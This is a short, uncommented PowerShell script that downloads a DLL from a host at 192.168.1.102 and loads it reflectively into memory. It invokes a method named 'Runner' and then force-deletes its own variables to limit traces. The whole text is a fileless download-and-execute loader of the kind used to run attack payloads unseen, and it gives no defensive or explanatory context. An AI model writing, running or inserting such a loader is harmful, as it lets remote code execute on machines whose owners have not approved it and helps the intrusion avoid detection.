$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.102/ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("Runner")
$method.Invoke(0, $null)

Remove-Variable -Name data,assem,class,method -ErrorAction SilentlyContinue -Force
